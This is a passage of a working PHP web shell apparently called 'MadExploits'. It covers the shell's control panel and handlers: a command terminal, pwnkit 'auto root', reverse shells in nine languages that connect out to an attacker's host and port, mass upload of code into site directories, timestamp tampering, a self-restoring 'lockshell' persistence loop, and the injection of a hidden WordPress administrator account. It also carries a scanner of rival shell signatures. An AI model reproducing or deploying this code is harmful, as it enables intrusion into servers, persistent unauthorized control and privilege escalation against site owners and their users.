                    <div class="modal-body">
                        <select class="bc-NMN box-shadow" name="NMN-bc">
                            <option value="-">Choose Backconnect</option>
                            <option value="perl">Perl</option>
                            <option value="python">Python</option>
                            <option value="ruby">Ruby</option>
                            <option value="bash">Bash</option>
                            <option value="php">php</option>
                            <option value="nc">nc</option>
                            <option value="sh">sh</option>
                            <option value="xterm">Xterm</option>
                            <option value="golang">Golang</option>
                        </select>
                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
                        <br><br>
                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
                        <div class="modal-btn-form">
                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <div class="modal-mail-text">
                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
                                </div>
                                <br>
                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
                                <br><br>
                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
                                <br><br>
                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['f']) : ?>
        <div class="code-editor">
            <div class="code-editor-container">
                <div class="code-editor-head">
                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
                </div>
                <div class="code-editor-body">
                    <form action="" method="post">
                        <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                        <div class="modal-btn-form">
                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
                        <li><a href="?d=<?= hx($fungsi[0]()) ?>" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal'])) {
                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
                        <li><a href="?d=<?= hx($fungsi[0]()) ?>" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.mad-root');
                                                    $r_text = explode(" ", $response);
                                                    if ($r_text[0] == "uid=0(root)") {
                                                        if (isset($_POST['submit-root'])) {
                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                        }
                                                    } else {
                                                        echo "This Device Is Not Vulnerable\n";
                                                        echo cmd('cat /etc/os-release') . "\n";
                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
                                                    }
                                                } else {
                                                    $fungsi[24]('.mad-root');
                                                } ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
<?php if (isset($_GET['shellscan'])): ?>
    <?php
    $result = [];
    $scan_path = __DIR__; // Default to the directory of the script
    $shell_signatures = [
        '_halt_compiler',
        'file_get_contents\(',
        'shell_exec\(',
        'system\(',
        'base64_decode\(',
        'exec\(',
        'base64_encode\(',
        'webconsole',
        'uploader',
        'hacked',
        'eval\(',
        'set_time_limit\(',
        'move_uploaded_file',
        'hex2bin\(',
        'bin2hex\(',
        'WSOstripslashes',
        'AGUSTUS_17_1945',
        'Cyto',
        'con7ext',
        'Fileman',
        '68746d6c7370656369616c6368617273', // hex encoded string
        'xiaoxiannv',
        'ruzhu',
        'edoced_46esab',
        'Solevisible',
        'Zeerx7',
        'phpFileManager',
        'dZNOmgVpUDdbg',
        'indoxploit',
        'mini shell',
        'minishell',
        'tinyfilemanager.github.io',
        'xleet',
        'b374k',
    ];
    $file_extensions = [
        'py', 'ini', 'awd', 'conf', 'exe', 'phtml', 'ht', 'htaccess', 'gif',
        'php.gif', 'php', 'shtml', 'phar', 'inc', 'pjpeg', 'php.', 'pht', 'phtm',
        'fla', 'php.fla', 'php.FLA', 'PHP.FLA', 'php?.jpg', 'php.sql', 'php.txt',
        'txt.php', 'phps', 'PhaR', 'pHTM', 'xhtml', 'php%00', 'PHPs', 'pHAr',
        'pHps', 'pHTml', 'phTMl', 'phtML', 'phTML', 'phpS', 'PHP', 'Php', 'PHp',
        'pHp', 'pHP', 'PhP', 'phP', 'pHTML', 'Phtml', 'pHtMl', 'PhTmL', 'pHtml',
        'PHtml', 'PHTml', 'PHTMl', 'phtmL', 'PHTML', 'phTml', 'PHAR', 'Phar',
        'PHar', 'PHAr', 'pHAR', 'phAr', 'phaR', 'PHaR', 'phAR', 'Inc', 'INC',
        'inC', 'INc', 'iNC', 'iNc', 'Shtml', 'sHTML', 'sHtMl', 'ShTmL', 'PHP.',
        'PHAR.', 'php.XXXTXT', 'php1', 'php2', 'php3', 'php4', 'php5', 'php6',
        'php7', 'php8', 'php9', 'php10', 'php56', 'php74', 'pHar', 'php.inc',
        'php.jpg', 'php.pjpeg', 'PhtmL', 'phtML', 'phTML', 'shtmL', 'shtML',
        'shTML', 'json', 'JSON', 'pHp5', 'pHp1', 'pHp2', 'pHp3', 'pHp4',
        'pHp6', 'pHp7', 'pHp8', 'pHp9', 'pHp10', 'pHp56', 'pHp74', 'PHP1',
        'PHP2', 'PHP3', 'PHP4', 'PHP5', 'PHP6', 'PHP7', 'PHP8', 'PHP9', 'PHP10',
        'PHP56', 'PHP74', 'Php1', 'Php2', 'Php3', 'Php4', 'Php5', 'Php6',
        'Php7', 'Php8', 'Php9', 'Php10', 'Php56', 'Php74', 'phP1', 'phP2',
        'phP3', 'phP4', 'phP5', 'phP6', 'phP7', 'phP8', 'phP9', 'phP10',
        'phP56', 'phP74', 'PHp1', 'PHp2', 'PHp3', 'PHp4', 'PHp5', 'PHp6',
        'PHp7', 'PHp8', 'PHp9', 'PHp10', 'PHp56', 'PHp74', 'pHP1', 'pHP2',
        'pHP3', 'pHP4', 'pHP5', 'pHP6', 'pHP7', 'pHP8', 'pHP9', 'pHP10',
        'pHP11', 'pHP56', 'pHP74', 'PhP1', 'PhP2', 'PhP3', 'PhP4', 'PhP5',
        'PhP6', 'PhP7', 'PhP8', 'PhP9', 'PhP10', 'PhP56', 'PhP74', 'suspected'
    ];

    // Function to encode a path as hex
    function encodeHex($string) {
        return bin2hex($string);
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Sanitize and validate user inputs
        $scan_path = filter_input(INPUT_POST, 'scan_path', FILTER_SANITIZE_STRING) ?: __DIR__;

        // Validate scan path
        if (!is_dir($scan_path) || !is_readable($scan_path)) {
            $result[] = "Path yang diberikan tidak valid atau tidak dapat dibaca.";
        } else {
            // Sanitize and split paths
            $paths = array_filter(array_map('trim', explode("\n", $scan_path)));
            foreach ($paths as $path) {
                // Prevent directory traversal attacks
                $path = realpath($path);
                if ($path === false || !is_readable($path)) {
                    $result[] = "[ERROR] Invalid or non-readable path: " . htmlspecialchars($path);
                    continue;
                }

                // Scan for shell signatures and file extensions
                $directory_iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
                foreach ($directory_iterator as $file) {
                    if ($file->isFile()) {
                        // Check file extension
                        $extension = strtolower(pathinfo($file->getFilename(), PATHINFO_EXTENSION));
                        if (in_array($extension, $file_extensions)) {
                            $file_contents = file_get_contents($file->getRealPath());

                            foreach ($shell_signatures as $signature) {
                                if (preg_match('/' . $signature . '/i', $file_contents)) {
                                    $filePath = htmlspecialchars($file->getRealPath());
                                    $dirPath = htmlspecialchars(dirname($filePath));
                                    $encodedDirPath = encodeHex($dirPath);
                                    $result[] = "CEK: <a href=\"?d={$encodedDirPath}\" class=\"result-link\">{$filePath}</a>";
                                    break; // Stop checking other signatures once one is found
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    ?>

    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">
                <h3><b><i id="modal-title">
                    <center>SHELL SCANNER</center>
                </i></b></h3>
            </div>
            <div class="modal-body">
                <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                    <!-- Step 3: Show scan results -->
                    <div class="modal-isi">
                        <div class="result-container">
                            <?php foreach ($result as $line): ?>
                                <p class="result-line"><?= $line ?></p>
                            <?php endforeach; ?>
                        </div>
                        <div class="modal-btn-form">
                            <a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </div>
                <?php else: ?>
                    <form action="" method="post">
                        <div class="modal-isi">
                            <input type="text" name="scan_path" class="modal-create-input" placeholder="Path Direktori" value="<?= htmlspecialchars($scan_path) ?>" required>
                            <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit_scan" value="Scan" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                <?php endif; ?>
            </div>
        </div>
    </div>
<?php endif; ?>
<?php if (isset($_GET['massupload'])): ?>
    <?php
    $result = [];
    $upload_path = __DIR__; // Default to the directory of the script
    $upload_type = 'biasa'; // Default upload type
    $file_name = '';
    $source_code = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Sanitize and validate user inputs
        $upload_path = filter_input(INPUT_POST, 'upload_path', FILTER_SANITIZE_STRING) ?: __DIR__;
        $upload_type = filter_input(INPUT_POST, 'upload_type', FILTER_SANITIZE_STRING);
        $file_name = filter_input(INPUT_POST, 'file_name', FILTER_SANITIZE_STRING);
        $source_code = filter_input(INPUT_POST, 'source_code', FILTER_SANITIZE_STRING);

        // Validate upload path and file name
        if (empty($file_name) || !preg_match('/^[\w\-\.]+$/', $file_name)) {
            $result[] = "Nama file tidak valid.";
        } elseif (!is_dir($upload_path) || !is_writable($upload_path)) {
            $result[] = "Path yang diberikan tidak valid atau tidak dapat ditulis.";
        } else {
            // Sanitize and split paths
            $paths = array_filter(array_map('trim', explode("\n", $upload_path)));
            foreach ($paths as $path) {
                // Prevent directory traversal attacks
                $path = realpath($path);
                if ($path === false || !is_writable($path)) {
                    $result[] = "[ERROR] Invalid or non-writable path: " . htmlspecialchars($path);
                    continue;
                }

                $full_path = rtrim($path, '/') . '/' . $file_name;
                if (file_put_contents($full_path, $source_code) !== false) {
                    $result[] = "[DONE] " . htmlspecialchars($full_path);
                } else {
                    $result[] = "[ERROR] Failed to write to: " . htmlspecialchars($full_path);
                }
            }
        }
    }
    ?>

    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">
                <h3><b><i id="modal-title">
                    <center>MASS UPLOAD</center>
                </i></b></h3>
            </div>
            <div class="modal-body">
                <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                    <div class="modal-isi">
                        <div class="result-container">
                            <?php foreach ($result as $line): ?>
                                <p class="result-line"><?= htmlspecialchars($line) ?></p>
                            <?php endforeach; ?>
                        </div>
                        <div class="modal-btn-form">
                            <a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </div>
                <?php else: ?>
                    <form action="" method="post">
                        <div class="modal-isi">
                            <input type="text" name="upload_path" class="modal-create-input" placeholder="Path Direktori" value="<?= htmlspecialchars($upload_path) ?>" required>
                            <br><br>
                            <label>
                                <input type="radio" name="upload_type" value="biasa" <?= $upload_type === 'biasa' ? 'checked' : '' ?>> Biasa
                            </label>
                            <label>
                                <input type="radio" name="upload_type" value="massal" <?= $upload_type === 'massal' ? 'checked' : '' ?>> Massal
                            </label>
                            <br><br>
                            <input type="text" name="file_name" class="modal-create-input" placeholder="Nama File" value="<?= htmlspecialchars($file_name) ?>" required>
                            <br><br>
                            <textarea name="source_code" class="modal-create-input" placeholder="Source Code" rows="10" required><?= htmlspecialchars($source_code) ?></textarea>
                            <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit_upload" value="Upload" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                <?php endif; ?>
            </div>
        </div>
    </div>
<?php endif; ?>
<?php if (isset($_GET['randomupload'])): ?>
    <?php
    function encodeHex($str) {
        return bin2hex($str);
    }

    function decodeHex($hex) {
        return hex2bin($hex);
    }

    $result = [];
    $upload_path = __DIR__; // Default to the directory of the script
    $file_name = '';
    $source_code = '';
    $directories = [];

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Sanitize and validate user inputs
        $upload_path = filter_input(INPUT_POST, 'upload_path', FILTER_SANITIZE_STRING) ?: __DIR__;
        $file_name = filter_input(INPUT_POST, 'file_name', FILTER_SANITIZE_STRING);
        $source_code = filter_input(INPUT_POST, 'source_code', FILTER_SANITIZE_STRING);

        // Check if this is the second step where the user selects directories
        if (isset($_POST['selected_dirs'])) {
            $selected_dirs = $_POST['selected_dirs'];

            foreach ($selected_dirs as $dir) {
                $dir = realpath($dir); // Sanitize directory paths
                if ($dir !== false && is_writable($dir)) {
                    $full_path = rtrim($dir, '/') . '/' . $file_name;
                    if (file_put_contents($full_path, $source_code) !== false) {
                        $result[] = "[DONE] File uploaded to " . htmlspecialchars($full_path);
                    } else {
                        $result[] = "[ERROR] Failed to write to: " . htmlspecialchars($full_path);
                    }
                } else {
                    $result[] = "[ERROR] Directory not writable: " . htmlspecialchars($dir);
                }
            }
        } else {
            // Step 1: Run the `find` command and show directories for selection
            $paths = array_filter(array_map('trim', explode("\n", $upload_path)));
            foreach ($paths as $path) {
                // Prevent directory traversal attacks
                $path = realpath($path);
                if ($path === false || !is_dir($path)) {
                    $result[] = "[ERROR] Invalid path: " . htmlspecialchars($path);
                    continue;
                }

                // Find directories with PHP files and sort them by file count
                $command = "find " . escapeshellarg($path) . " -type f -name \"*.php\" -print0 | xargs -0 dirname | sort | uniq -c | sort -nr";
                $output = cmd($command);

                if ($output === null) {
                    $result[] = "[ERROR] Failed to run the `find` command.";
                    continue;
                }

                // Parse command output and extract directories
                $lines = explode("\n", trim($output));
                foreach ($lines as $line) {
                    $dir = preg_replace('/^\d+\s+/', '', trim($line)); // Remove counts and leading spaces
                    if (is_dir($dir) && is_writable($dir)) {
                        $directories[] = $dir;
                    }
                }
            }
        }
    }
    ?>

    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">
                <h3><b><i id="modal-title">
                    <center>REKOMENDASI UPLOAD</center>
                </i></b></h3>
            </div>
            <div class="modal-body">
                <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['selected_dirs'])): ?>
                    <!-- Step 3: Show upload results -->
                    <div class="modal-isi">
                        <div class="result-container">
                            <?php foreach ($result as $line): ?>
                                <?php
                                // Extract the directory path from the result if available
                                if (strpos($line, "[DONE]") !== false) {
                                    $path = htmlspecialchars(explode(" ", $line, 3)[2]); // Extract path
                                    $encodedPath = encodeHex($path);
                                    $line = "<a href=\"?d={$encodedPath}\" class=\"result-link\">{$line}</a>";
                                }
                                ?>
                                <p class="result-line"><?= $line ?></p>
                            <?php endforeach; ?>
                        </div>
                        <div class="modal-btn-form">
                            <a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </div>
                <?php elseif ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                    <!-- Step 2: Show list of directories for selection -->
                    <form action="" method="post">
                        <div class="modal-isi">
                            <h4>Select Target Directories:</h4>
                            <div class="scrollable-box">
                                <?php foreach ($directories as $dir): ?>
                                    <label class="scrollable-option">
                                        <input type="checkbox" name="selected_dirs[]" value="<?= htmlspecialchars($dir) ?>">
                                        <?= htmlspecialchars($dir) ?>
                                    </label>
                                    <br>
                                <?php endforeach; ?>
                            </div>
                            <br>
                            <input type="hidden" name="upload_path" value="<?= htmlspecialchars($upload_path) ?>">
                            <input type="hidden" name="file_name" value="<?= htmlspecialchars($file_name) ?>">
                            <input type="hidden" name="source_code" value="<?= htmlspecialchars($source_code) ?>">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="confirm_upload" value="Upload to Selected Directories" class="btn-modal-close box-shadow">
                            <a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                <?php else: ?>
                    <!-- Step 1: Input form -->
                    <form action="" method="post">
                        <div class="modal-isi">
                            <input type="text" name="upload_path" class="modal-create-input" placeholder="Path Direktori" value="<?= htmlspecialchars($upload_path) ?>" required>
                            <br><br>
                            <input type="text" name="file_name" class="modal-create-input" placeholder="Nama File" value="<?= htmlspecialchars($file_name) ?>" required>
                            <br><br>
                            <textarea name="source_code" class="modal-create-input" placeholder="Source Code" rows="10" required><?= htmlspecialchars($source_code) ?></textarea>
                            <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit_find" value="Find and Select Directories" class="btn-modal-close box-shadow">
                            <a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                <?php endif; ?>
            </div>
        </div>
    </div>

<?php endif; ?>

    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
<?php if ($_GET['touch'] == true) : ?>
<div class="modal active">
    <div class="modal-container">
        <div class="modal-header">
            <h3><b><i id="modal-title">Change Time : <?= unx($_GET['touch']) ?></i></b></h3>
        </div>
        <div class="modal-body">
            <form action="" method="post">
                <span id="modal-input">
                    <input type="text" name="touchFile" class="modal-create-input" placeholder="Date and Time (YYYY-MM-DD HH:MM:SS)">
                </span>
                <div class="modal-btn-form">
                    <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                </div>
            </form>
        </div>
    </div>
</div>
<?php endif; ?>

    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <script>
        $(document).ready(function() {


            $('#create_folder').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
                event.preventDefault();
            });
            $('#create_file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
                event.preventDefault();
            });
            $('#lock-file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                event.preventDefault();
            });
            $('#root-user').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#create-rdp').click(function() {
                $('.modal').show();
                $('#modal-title').html(':: CREATE RDP');
                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            var myTextarea = document.getElementById("code");

            var editor = CodeMirror.fromTextArea(myTextarea, {
                mode: "xml",
                lineNumbers: true,
                theme: "ayu-mirage",
                extraKeys: {
                    "Ctrl-Space": "autocomplete"
                },
                hintOptions: {
                    completeSingle: false,
                },
            });

        });
    </script>
</body>

</html>
<?php

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_host = $_POST['db_host'];
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($conn->connect_error) {
        failed();
        die("Error Cug : " . $conn->connect_error);
    }

    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'MadExploits', '', '', NOW(), '', 0, 'MadExploits')";

    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";

    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        $result = $conn->query($sqltakeuserid);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user_id = $row["ID"];

            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

            if ($conn->query($sqlusermeta) === TRUE) {
                Success();
            } else {
                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.\n";
        }

        Success();
    } else {
        echo "Error: " . $sql . "\n" . $conn->error;
    }

    $conn->close();
}



if (isset($_GET['unlockshell'])) {
    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
        success();
    } else {
        failed();
    }
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['NMN-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
    } elseif ($_POST['NMN-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } elseif ($_POST['NMN-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } elseif ($_POST['NMN-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } elseif ($_POST['NMN-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } elseif ($_POST['NMN-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } elseif ($_POST['NMN-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } elseif ($_POST['NMN-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } elseif ($_POST['NMN-bc'] == "golang") {
        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}



if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
    }
    if (NMN_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (NMN_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function NMN_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
        success();
    } else {
        failed();
    }
}
if (isset($_POST['NMN-up-submit'])) {
    $namaFilenya = $_FILES['NMN-upload']['name'];
    $tmpName = $_FILES['NMN-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        success();
    } else {
        failed();
    }
}
if (isset($_POST['upload-from-link'])) {
    $fileUrl = $_POST['file_url'];
    $uploadDirectory = __DIR__; // Current directory
    $fileName = basename($fileUrl);
    $destination = $uploadDirectory . DIRECTORY_SEPARATOR . $fileName;

    // Download file using file_get_contents and file_put_contents
    $fileContent = file_get_contents($fileUrl);
    if ($fileContent !== false) {
        $result = file_put_contents($destination, $fileContent);
        if ($result !== false) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
